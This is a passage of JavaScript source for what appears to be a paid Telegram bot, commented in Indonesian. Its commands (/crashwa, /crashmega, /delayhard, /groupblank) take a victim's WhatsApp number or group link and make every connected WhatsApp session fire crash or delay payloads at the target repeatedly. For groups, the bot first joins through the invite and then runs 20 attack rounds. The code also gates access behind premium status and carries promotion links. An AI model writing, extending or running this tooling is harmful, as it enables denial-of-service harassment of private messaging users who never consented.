      errorMsg += ` ᴀɢᴀʀ ғɪᴛᴜʀ ʙɪsᴀ ʙᴇᴋᴇʀᴊᴀ</b></blockquote>`;
      return bot.sendMessage(chatId, errorMsg, { parse_mode: "HTML" });
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return bot.sendMessage(
          chatId,
          `<blockquote><b>⏳ ᴍᴀᴀғ ғɪᴛᴜʀ ʟᴀɢɪ ᴅɪ ᴊᴇᴅᴀ</b>\n<b>ᴛᴜɴɢɢᴜ ʜɪɴɢɢᴀ ${formatDelay(remaining)} ʟᴀɢɪ</b></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    }

    // ✅ KIRIM PESAN SUKSES DULU
    await bot.sendVideo(
      chatId,
      mediabug, 
      {
        caption: `<blockquote><b>ꆰ ʙᴜɢ sᴜᴅᴀʜ ᴛᴇʀᴋɪʀɪᴍ</b>\n
╭────────────────
│<b>ᴛᴀʀɢᴇᴛ</b>: ${formattedNumber}
│<b>ᴛʏᴘᴇ</b>: /${commandName}
│<b>sᴄʀɪᴘᴛ ᴠᴇʀsɪᴏɴ</b>: 𝟾.𝟶.𝟶
│<b>sᴛᴀᴛᴜs</b>: ᴅᴏɴᴇ 🚀
╰────────────────
</blockquote>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'ɪɴғᴏ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" },
              { text: 'ᴄᴇᴋ ᴛᴀʀɢᴇᴛ', url: `https://wa.me/${formattedNumber}`, style: "success", icon_custom_emoji_id: "5316591362605332682" }
              ],
              [
              { text: 'ʀᴀᴛᴛɪɴɢ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial/41", style: "success", icon_custom_emoji_id: "5316692281451887373" }
            ]
          ]
        }
      }
    );

    // ✅ UPDATE LAST BUG TIME (MULAI JEDA)
    updateLastBugTime();

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) {
          console.log(`Bot ${botNum} offline`);
          failCount++;
          continue;
        }

        bug1(sock, target);
        bug1(sock, target);

        successCount++;

        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) {
          await new Promise(resolve => setTimeout(resolve, currentDelay));
        }

      } catch (outerError) {
        failCount++;
        console.error(`[Bot ${botNum}] Error fatal:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("Main Error:", mainError);
    await bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴇʀʀᴏʀ sɪsᴛᴇᴍ. ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/\/(crashwa)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId); 

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  if (!match[2]) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /crashwa 628123456789</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries());

    allSessions = allSessions.filter(([_, data]) => {
      if (data.type === "public") {
        return true; 
      }
      if (data.type === "private") {
        return data.ownerId === userId; 
      }
      return false;
    });

    if (allSessions.length === 0) {
      let errorMsg = `<blockquote><b>[!] ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙᴏᴛ`;
      errorMsg += ` (ᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ ᴘʀɪᴠᴀᴛᴇ ᴍɪʟɪᴋ ᴀɴᴅᴀ)`;
      errorMsg += ` ᴛᴇʀʜᴜʙᴜɴɢ. ɢᴜɴᴀᴋᴀɴ /ᴀᴅᴅsᴇɴᴅᴇʀᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ /ᴀᴅᴅsᴇɴᴅᴇʀᴘʀɪᴠᴀᴛ`;
      errorMsg += ` ᴀɢᴀʀ ғɪᴛᴜʀ ʙɪsᴀ ʙᴇᴋᴇʀᴊᴀ</b></blockquote>`;
      return bot.sendMessage(chatId, errorMsg, { parse_mode: "HTML" });
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return bot.sendMessage(
          chatId,
          `<blockquote><b>⏳ ᴍᴀᴀғ ғɪᴛᴜʀ ʟᴀɢɪ ᴅɪ ᴊᴇᴅᴀ</b>\n<b>ᴛᴜɴɢɢᴜ ʜɪɴɢɢᴀ ${formatDelay(remaining)} ʟᴀɢɪ</b></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    }

    await bot.sendVideo(
      chatId,
      mediabug, 
      {
        caption: `<blockquote><b>ꆰ ʙᴜɢ sᴜᴅᴀʜ ᴛᴇʀᴋɪʀɪᴍ</b>\n
╭────────────────
│<b>ᴛᴀʀɢᴇᴛ</b>: ${formattedNumber}
│<b>ᴛʏᴘᴇ</b>: /${commandName}
│<b>sᴄʀɪᴘᴛ ᴠᴇʀsɪᴏɴ</b>: 𝟾.𝟶.𝟶
│<b>sᴛᴀᴛᴜs</b>: ᴅᴏɴᴇ 🚀
╰────────────────
</blockquote>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'ɪɴғᴏ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" },
              { text: 'ᴄᴇᴋ ᴛᴀʀɢᴇᴛ', url: `https://wa.me/${formattedNumber}`, style: "success", icon_custom_emoji_id: "5316591362605332682" }
              ],
              [
              { text: 'ʀᴀᴛᴛɪɴɢ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial/41", style: "success", icon_custom_emoji_id: "5316692281451887373" }
            ]
          ]
        }
      }
    );

    updateLastBugTime();

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) {
          console.log(`Bot ${botNum} offline`);
          failCount++;
          continue;
        }

        bug2(sock, target);
        bug2(sock, target);

        successCount++;

        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) {
          await new Promise(resolve => setTimeout(resolve, currentDelay));
        }

      } catch (outerError) {
        failCount++;
        console.error(`[Bot ${botNum}] Error fatal:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("Main Error:", mainError);
    await bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴇʀʀᴏʀ sɪsᴛᴇᴍ. ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/\/(crashmega)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId); 

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  if (!match[2]) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /crashmega 628123456789</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries());

    allSessions = allSessions.filter(([_, data]) => {
      if (data.type === "public") {
        return true; 
      }
      if (data.type === "private") {
        return data.ownerId === userId; 
      }
      return false;
    });

    if (allSessions.length === 0) {
      let errorMsg = `<blockquote><b>[!] ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙᴏᴛ`;
      errorMsg += ` (ᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ ᴘʀɪᴠᴀᴛᴇ ᴍɪʟɪᴋ ᴀɴᴅᴀ)`;
      errorMsg += ` ᴛᴇʀʜᴜʙᴜɴɢ. ɢᴜɴᴀᴋᴀɴ /ᴀᴅᴅsᴇɴᴅᴇʀᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ /ᴀᴅᴅsᴇɴᴅᴇʀᴘʀɪᴠᴀᴛ`;
      errorMsg += ` ᴀɢᴀʀ ғɪᴛᴜʀ ʙɪsᴀ ʙᴇᴋᴇʀᴊᴀ</b></blockquote>`;
      return bot.sendMessage(chatId, errorMsg, { parse_mode: "HTML" });
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return bot.sendMessage(
          chatId,
          `<blockquote><b>⏳ ᴍᴀᴀғ ғɪᴛᴜʀ ʟᴀɢɪ ᴅɪ ᴊᴇᴅᴀ</b>\n<b>ᴛᴜɴɢɢᴜ ʜɪɴɢɢᴀ ${formatDelay(remaining)} ʟᴀɢɪ</b></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    }

    await bot.sendVideo(
      chatId,
      mediabug, 
      {
        caption: `<blockquote><b>ꆰ ʙᴜɢ sᴜᴅᴀʜ ᴛᴇʀᴋɪʀɪᴍ</b>\n
╭────────────────
│<b>ᴛᴀʀɢᴇᴛ</b>: ${formattedNumber}
│<b>ᴛʏᴘᴇ</b>: /${commandName}
│<b>sᴄʀɪᴘᴛ ᴠᴇʀsɪᴏɴ</b>: 𝟾.𝟶.𝟶
│<b>sᴛᴀᴛᴜs</b>: ᴅᴏɴᴇ 🚀
╰────────────────
</blockquote>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'ɪɴғᴏ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" },
              { text: 'ᴄᴇᴋ ᴛᴀʀɢᴇᴛ', url: `https://wa.me/${formattedNumber}`, style: "success", icon_custom_emoji_id: "5316591362605332682" }
              ],
              [
              { text: 'ʀᴀᴛᴛɪɴɢ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial/41", style: "success", icon_custom_emoji_id: "5316692281451887373" }
            ]
          ]
        }
      }
    );

    updateLastBugTime();

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) {
          console.log(`Bot ${botNum} offline`);
          failCount++;
          continue;
        }

        bug3(sock, target);
        bug3(sock, target);

        successCount++;

        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) {
          await new Promise(resolve => setTimeout(resolve, currentDelay));
        }

      } catch (outerError) {
        failCount++;
        console.error(`[Bot ${botNum}] Error fatal:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("Main Error:", mainError);
    await bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴇʀʀᴏʀ sɪsᴛᴇᴍ. ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/\/(delayhard)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId); 

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  if (!match[2]) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ᴛᴀʀɢᴇᴛ ɴᴜᴍʙᴇʀ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɴᴜᴍʙᴇʀ.\nᴇxᴀᴍᴘʟᴇ : /delayhard 628123456789</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const [targetNumber] = match[2].split(" ");
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  try {
    let allSessions = Array.from(sessions.entries());

    allSessions = allSessions.filter(([_, data]) => {
      if (data.type === "public") {
        return true; 
      }
      if (data.type === "private") {
        return data.ownerId === userId; 
      }
      return false;
    });

    if (allSessions.length === 0) {
      let errorMsg = `<blockquote><b>[!] ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙᴏᴛ`;
      errorMsg += ` (ᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ ᴘʀɪᴠᴀᴛᴇ ᴍɪʟɪᴋ ᴀɴᴅᴀ)`;
      errorMsg += ` ᴛᴇʀʜᴜʙᴜɴɢ. ɢᴜɴᴀᴋᴀɴ /ᴀᴅᴅsᴇɴᴅᴇʀᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ /ᴀᴅᴅsᴇɴᴅᴇʀᴘʀɪᴠᴀᴛ`;
      errorMsg += ` ᴀɢᴀʀ ғɪᴛᴜʀ ʙɪsᴀ ʙᴇᴋᴇʀᴊᴀ</b></blockquote>`;
      return bot.sendMessage(chatId, errorMsg, { parse_mode: "HTML" });
    }

    if (lastBugTime > 0) {
      const remaining = getRemainingTime();
      if (remaining > 0) {
        return bot.sendMessage(
          chatId,
          `<blockquote><b>⏳ ᴍᴀᴀғ ғɪᴛᴜʀ ʟᴀɢɪ ᴅɪ ᴊᴇᴅᴀ</b>\n<b>ᴛᴜɴɢɢᴜ ʜɪɴɢɢᴀ ${formatDelay(remaining)} ʟᴀɢɪ</b></blockquote>`,
          { parse_mode: "HTML" }
        );
      }
    }

    await bot.sendVideo(
      chatId,
      mediabug, 
      {
        caption: `<blockquote><b>ꆰ ʙᴜɢ sᴜᴅᴀʜ ᴛᴇʀᴋɪʀɪᴍ</b>\n
╭────────────────
│<b>ᴛᴀʀɢᴇᴛ</b>: ${formattedNumber}
│<b>ᴛʏᴘᴇ</b>: /${commandName}
│<b>sᴄʀɪᴘᴛ ᴠᴇʀsɪᴏɴ</b>: 𝟾.𝟶.𝟶
│<b>sᴛᴀᴛᴜs</b>: ᴅᴏɴᴇ 🚀
╰────────────────
</blockquote>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'ɪɴғᴏ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial", style: "success", icon_custom_emoji_id: "5316826301611390284" },
              { text: 'ᴄᴇᴋ ᴛᴀʀɢᴇᴛ', url: `https://wa.me/${formattedNumber}`, style: "success", icon_custom_emoji_id: "5316591362605332682" }
              ],
              [
              { text: 'ʀᴀᴛᴛɪɴɢ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial/41", style: "success", icon_custom_emoji_id: "5316692281451887373" }
            ]
          ]
        }
      }
    );

    updateLastBugTime();

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      try {
        if (!sock?.user) {
          console.log(`Bot ${botNum} offline`);
          failCount++;
          continue;
        }

        bug4(sock, target);
        bug4(sock, target);

        successCount++;

        const currentDelay = getCurrentDelay();
        if (currentDelay > 0) {
          await new Promise(resolve => setTimeout(resolve, currentDelay));
        }

      } catch (outerError) {
        failCount++;
        console.error(`[Bot ${botNum}] Error fatal:`, outerError);
      }
    }

  } catch (mainError) {
    console.error("Main Error:", mainError);
    await bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴇʀʀᴏʀ sɪsᴛᴇᴍ. ᴄᴏʙᴀ ʟᴀɢɪ ɴᴀɴᴛɪ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/\/(groupblank)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const commandName = match[1];
  const userId = msg.from.id;
  const idgc = String(chatId);

  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪsᴀ ᴅɪ ᴀᴄᴄsᴇs ᴜsᴇʀ ᴘʀᴇᴍɪᴜᴍ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  if (!match[2]) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴍɪssɪɴɢ ʟɪɴᴋ ɢʀᴏᴜᴘ. ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ᴡʜᴀᴛsᴀᴘᴘ ɢʀᴏᴜᴘ ɪɴᴠɪᴛᴇ ʟɪɴᴋ.\nᴇxᴀᴍᴘʟᴇ : /groupblank https://chat.whatsapp.com/abcd1234</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const link = match[2].trim();
  const inviteCode = link.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/)?.[1];
  if (!inviteCode) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ʟɪɴᴋ ɢʀᴏᴜᴘ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ. ᴘᴀsᴛɪᴋᴀɴ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ʟɪɴᴋ ᴜɴᴅᴀɴɢᴀɴ ᴡʜᴀᴛsᴀᴘᴘ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
    if (data.type === "public") return true;
    if (data.type === "private") return data.ownerId === userId;
    return false;
  });

  if (allSessions.length === 0) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴛɪᴅᴀᴋ ᴀᴅᴀ ʙᴏᴛ (ᴘᴜʙʟɪᴄ ᴀᴛᴀᴜ ᴘʀɪᴠᴀᴛᴇ ᴍɪʟɪᴋ ᴀɴᴅᴀ) ᴛᴇʀʜᴜʙᴜɴɢ. ɢᴜɴᴀᴋᴀɴ /ᴀᴅᴅsᴇɴᴅᴇʀ ᴀɢᴀʀ ғɪᴛᴜʀ ʙɪsᴀ ʙᴇᴋᴇʀᴊᴀ</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  let groupInfo = null;
  let selectedBot = null;

  for (const [botNum, data] of allSessions) {
    const sock = data.sock;
    if (sock?.user) {
      try {
        groupInfo = await sock.groupGetInviteInfo(inviteCode);
        selectedBot = sock;
        break;
      } catch (e) {
        console.log(`Gagal ambil info grup dengan bot ${botNum}:`, e);
        continue;
      }
    }
  }

  if (!groupInfo || !selectedBot) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴋsᴇs ɢʀᴏᴜᴘ ᴅᴇɴɢᴀɴ ʟɪɴᴋ ᴛᴇʀsᴇʙᴜᴛ. ᴘᴀsᴛɪᴋᴀɴ ʟɪɴᴋ ᴠᴀʟɪᴅ ᴀᴛᴀᴜ ʙᴏᴛ ᴛɪᴅᴀᴋ ᴅɪʙʟᴏᴋɪʀ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const groupJid = groupInfo.id;
  const groupName = groupInfo.subject || "Unknown";
  const announce = groupInfo.announce || false;

  if (announce) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ, sᴇᴘᴇʀᴛɪɴʏᴀ ɢʀᴏᴜᴘ ɪɴɪ ᴍᴇᴍʙᴜᴛᴜʜᴋᴀɴ ɪᴢɪɴ ᴀᴅᴍɪɴ ᴜɴᴛᴜᴋ ᴍᴇɴɢɪʀɪᴍ ᴘᴇsᴀɴ ᴀᴛᴀᴜ ʜᴀɴʏᴀ ᴀᴅᴍɪɴ ʏᴀɴɢ ᴅᴀᴘᴀᴛ ᴄʜᴀᴛ. ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢɪʀɪᴍ ʙᴜɢ.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  let joined = false;
  try {
    await selectedBot.groupAcceptInvite(inviteCode);
    joined = true;
    console.log(`✅ Bot berhasil join grup ${groupName}`);
  } catch (e) {
    console.log(`❌ Gagal join grup:`, e);
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (sock === selectedBot) continue;
      if (sock?.user) {
        try {
          await sock.groupAcceptInvite(inviteCode);
          joined = true;
          console.log(`✅ Bot ${botNum} berhasil join grup ${groupName}`);
          break;
        } catch (err) {
          console.log(`Bot ${botNum} gagal join:`, err);
        }
      }
    }
  }

  if (!joined) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>[!] Gagal bergabung ke grup. Mungkin link sudah kadaluarsa, grup penuh, atau akun diblokir.</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  await bot.sendPhoto(
    chatId,
    image,
    {
      caption: `<blockquote><b>ꆰ ʙᴜɢ ɢʀᴏᴜᴘ sᴜᴅᴀʜ ᴛᴇʀᴋɪʀɪᴍ</b>\n
╭────────────────
│<b>ɢʀᴏᴜᴘ</b>: ${groupName}
│<b>ᴛʏᴘᴇ</b>: /${commandName}
│<b>sᴛᴀᴛᴜs</b>: ᴅᴏɴᴇ 🚀
╰────────────────
</blockquote>`,
      parse_mode: 'HTML',
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'ɪɴғᴏ sᴄʀɪᴘᴛ', url: "https://t.me/KintanaOfficial" },
            { text: 'ʟɪɴᴋ ɢʀᴏᴜᴘ', url: link }
          ]
        ]
      }
    }
  );

  (async () => {
    for (const [botNum, data] of allSessions) {
      const sock = data.sock;
      if (!sock?.user) continue;

      try {
        for (let i = 0; i < 20; i++) {
          await Promise.allSettled([
            crashmegaGB(sock, groupJid).catch(() => {}),
            halonyetGB(sock, groupJid).catch(() => {}),
            halonyetGB(sock, groupJid).catch(() => {})
          ]);

          const currentDelay = getCurrentDelay();
          if (currentDelay > 0) {
            await new Promise(resolve => setTimeout(resolve, currentDelay));
          }
        }
      } catch (err) {
        console.error(`Bot ${botNum} error:`, err);
      }
    }
  })();
});
//============= COMMAND /blockcmd =============//
bot.onText(/^\/blockcmd(?:\s+(on|off))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isOwner(userId)) {
    return bot.sendMessage(
      chatId,
      `<blockquote><b>ᴍᴀᴀғ ғɪᴛᴜʀ ɪɴɪ ʜᴀɴʏᴀ ʙɪꜱᴀ ᴅɪ ᴀᴄᴄᴇꜱ ᴏʟᴇʜ ᴏᴡɴᴇʀ</b></blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      }
    );
  }

  const arg = (match[1] || "").toLowerCase();

  if (arg === "on") {
    blockCmdEnabled = true;
    saveBlockCmd();
    return bot.sendMessage(
      chatId,
      `<blockquote>✅ <b>ʙʟᴏᴄᴋᴄᴍᴅ ᴅɪᴀᴋᴛɪꜰᴋᴀɴ</b>

• Semua command (termasuk /start) hanya bisa dipakai owner / premium / admin
• User lain akan menerima pesan "beli script"
• Jika orang lain menambahkan bot ke grup Telegram, bot otomatis keluar</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  if (arg === "off") {
    blockCmdEnabled = false;
    saveBlockCmd();
    return bot.sendMessage(
      chatId,
      `<blockquote>❌ <b>ʙʟᴏᴄᴋᴄᴍᴅ ᴅɪᴍᴀᴛɪᴋᴀɴ</b>
Semua user bisa memakai bot kembali.</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const status = blockCmdEnabled ? "ᴏɴ ✅" : "ᴏғғ ❌";
  await bot.sendMessage(
    chatId,
    `<blockquote>📌 ꜱᴛᴀᴛᴜꜱ ʙʟᴏᴄᴋᴄᴍᴅ: <b>${status}</b>

━━━━━━━━━━━━━━━━
💡 <b>ᴄᴀʀᴀ ᴘᴇɴɢɢᴜɴᴀᴀɴ:</b>
/ʙʟᴏᴄᴋᴄᴍᴅ ᴏɴ  → ᴋᴜɴᴄɪ ʙᴏᴛ + ᴀɴᴛɪ ᴋɪᴅɴᴀᴘ
/ʙʟᴏᴄᴋᴄᴍᴅ ᴏғғ → ʙᴜᴋᴀ ᴀᴋꜱᴇꜱ ᴜɴᴛᴜᴋ ᴜᴍᴜᴍ
━━━━━━━━━━━━━━━━</blockquote>`,
    { parse_mode: "HTML" }
  );
});
//============= END /blockcmd ==================//
bot.onText(/\/modemurbuggb(?:\s+(on|off))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const arg = match[1];

  try {
    if (msg.chat.type === "private") {
      return bot.sendMessage(chatId, 
        `<blockquote>ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴅɪ ɢʀᴜᴘ!</blockquote>`,
        { 
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
            ]
          }
        }
      );
    }

    const chatMember = await bot.getChatMember(chatId, userId);
    const isAdmin = chatMember.status === 'creator' || chatMember.status === 'administrator';
    const isPremium = premiumUsers.includes(userId);

    if (!isOwner(userId) && !(isPremium && isAdmin)) {
      return bot.sendMessage(chatId,
        `<blockquote>❌ ᴘᴇʀɪɴᴛᴀʜ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ᴏᴡɴᴇʀ ᴀᴛᴀᴜ ᴘʀᴇᴍɪᴜᴍ ʏᴀɴɢ ᴊᴜɢᴀ ᴀᴅᴍɪɴ ɢʀᴜᴘ</blockquote>`,
        {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
            ]
          }
        }
      );
    }

    const idgc = String(chatId);
    const isActive = murbugGC.includes(idgc);

    if (arg === 'on') {
      if (isActive) {
        return bot.sendMessage(chatId,
          `<blockquote>⚠️ ɢʀᴜᴘ ɪɴɪ sᴜᴅᴀʜ ᴀᴋᴛɪꜰ ᴍᴏᴅᴇ ᴍᴜʀʙᴜɢ.</blockquote>`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "ᴄʀᴇᴀᴛᴏʀ", url: "https://t.me/heysaka", style: "success", icon_custom_emoji_id: "5319301933645707826" }]
              ]
            }
          }
        );
      }
